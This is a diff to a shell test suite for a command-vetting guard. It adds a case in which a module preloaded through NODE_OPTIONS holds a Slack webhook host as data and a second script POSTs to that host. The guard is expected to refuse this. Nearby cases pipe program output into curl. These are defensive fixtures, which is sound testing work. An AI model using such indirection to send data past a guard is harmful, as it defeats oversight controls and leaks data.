@@ -438,6 +438,14 @@ for runs in "node scripts/prints.ts | xargs curl -d hi" "curl -d hi \$(node scri
   run_d9 "$runs"
   read_refused "#2913 a listed address that can still reach a sender is refused: $runs"
 done
+# A module NODE_OPTIONS preloads shares the process with whatever node then runs, which can read what
+# it leaves on the global object (lessons review at 73967ea), so a name it holds only as data is
+# refused as before.
+printf '%s\n' 'globalThis.H = ["hooks.slack.com"];' > "$D9/scripts/preload.mjs"
+printf '%s\n' 'await fetch("https://" + globalThis.H[0] + "/services/T0/B0/x", { method: "POST" });' > "$D9/scripts/uses-preload.mjs"
+run_d9 "NODE_OPTIONS='--import ./scripts/preload.mjs' node scripts/uses-preload.mjs"
+read_refused "#2913 a module NODE_OPTIONS preloads, holding the host only as data, beside a script that sends, is refused"
+says "#2913 the refusal names the preloaded module" "preload.mjs"
 printf '%s\n' '#!/usr/bin/env bash' 'out=$(node scripts/prints.ts)' 'curl -d hi "$out"' > "$D9/scripts/captures.sh"
 run_d9 "bash scripts/captures.sh"
 read_refused "#2913 a script capturing what a program holding a listed address prints is refused"
